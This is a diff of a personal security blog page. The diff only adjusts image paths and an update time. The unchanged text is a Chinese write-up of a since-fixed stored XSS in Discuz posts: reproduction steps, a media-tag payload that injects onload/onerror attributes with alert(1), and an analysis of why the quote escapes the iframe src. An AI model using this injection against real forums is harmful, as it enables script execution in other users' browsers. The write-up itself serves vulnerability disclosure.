@@ -87,12 +87,12 @@
 <meta property="og:site_name" content="leveryd个人博客">
 <meta property="og:description" content="之前提交到某平台的漏洞，现在已经修复 漏洞证明2017.9月份在3.3,3.4最新版测试通过 前提条件:  用户组允许使用media标签 非PC端用户(程序会判断UA)  复现步骤:0x1. 可以使用media标签的用户发表一篇文章文章内容为1[media=mp3,200,300]http://www.tudou.com/programs/view/a&amp;apos; onload=alert(1)">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://looklook.gitee.io/img/5.png">
-<meta property="og:updated_time" content="2020-03-07T06:28:59.395Z">
+<meta property="og:image" content="https://looklook.gitee.io/blog/img/5.png">
+<meta property="og:updated_time" content="2020-03-07T07:16:45.927Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Disucz正文存储型XSS(2)">
 <meta name="twitter:description" content="之前提交到某平台的漏洞，现在已经修复 漏洞证明2017.9月份在3.3,3.4最新版测试通过 前提条件:  用户组允许使用media标签 非PC端用户(程序会判断UA)  复现步骤:0x1. 可以使用media标签的用户发表一篇文章文章内容为1[media=mp3,200,300]http://www.tudou.com/programs/view/a&amp;apos; onload=alert(1)">
-<meta name="twitter:image" content="https://looklook.gitee.io/img/5.png">
+<meta name="twitter:image" content="https://looklook.gitee.io/blog/img/5.png">
 
 
 
@@ -320,7 +320,7 @@
 <li>非PC端用户(程序会判断UA)</li>
 </ol>
 <p>复现步骤:<br>0x1. 可以使用media标签的用户发表一篇文章<br>文章内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[media=mp3,200,300]http://www.tudou.com/programs/view/a&apos; onload=alert(1) onerror=alert(1)[/media]</span><br></pre></td></tr></table></figure></p>
-<p>0x2. 使用手机，或者使用UA修改工具，修改成移动端头部<br>0x3. 浏览刚发过的帖子，视频加载完毕后，执行onload事件，会弹窗.<br><img src="/img/5.png" alt=""></p>
+<p>0x2. 使用手机，或者使用UA修改工具，修改成移动端头部<br>0x3. 浏览刚发过的帖子，视频加载完毕后，执行onload事件，会弹窗.<br><img src="/blog/img/5.png" alt=""></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=&quot;flv_dWh&quot;&gt;&lt;/span&gt;&lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;$(&apos;flv_dWh&apos;).innerHTML=(mobileplayer() ? &quot;&lt;iframe height=&apos;300&apos; width=&apos;200&apos; src=&apos;http://www.tudou.com/programs/view/html5embed.action?code=a\\\&apos; onload=alert(1) onerror=alert(1)&apos; frameborder=0 allowfullscreen&gt;&lt;/iframe&gt;&quot; : AC_FL_RunContent(&apos;width&apos;, &apos;200&apos;, &apos;height&apos;, &apos;300&apos;, &apos;allowNetworking&apos;, &apos;internal&apos;, &apos;allowScriptAccess&apos;, &apos;never&apos;, &apos;src&apos;, &apos;http://www.tudou.com/v/a\\\&apos; onload=alert(1) onerror=alert(1)&apos;, &apos;quality&apos;, &apos;high&apos;, &apos;bgcolor&apos;, &apos;#ffffff&apos;, &apos;wmode&apos;, &apos;transparent&apos;, &apos;allowfullscreen&apos;, &apos;true&apos;));&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br></pre></td></tr></table></figure>
 <p>前端页面中有这么一段代码，非PC时，mobileplayer()=true.<br>简化下上面的代码，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;flv_dWh&apos;).innerHTML=&quot;&lt;iframe src=&apos;http://www.tudou.com/programs/view/html5embed.action?code=a\\\&apos; onload=alert(1)&quot;</span><br></pre></td></tr></table></figure></p>
 <p>其中虽然src属性单引号看似没有闭合，但是实际上浏览器解析时已经闭合了，于是就引入了一个onload属性。</p>
